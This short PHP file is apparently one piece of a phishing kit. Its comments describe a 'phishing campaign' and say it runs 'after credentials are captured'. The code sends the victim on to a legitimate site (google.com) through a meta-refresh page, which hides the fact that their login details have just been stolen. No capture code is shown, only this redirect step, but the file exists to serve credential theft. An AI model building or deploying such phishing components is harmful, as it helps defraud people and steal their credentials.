<!-- redirect the person to this address.  can be internal to the phishing campaign or external  -->  
<?php

   $redirect_to = "http://www.google.com"; 
   
  // after credentials are captured, redirect to '$redirect_to'
  echo "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"refresh\" content=\"0;URL='" . $redirect_to . "'\" /></head></html>";
?>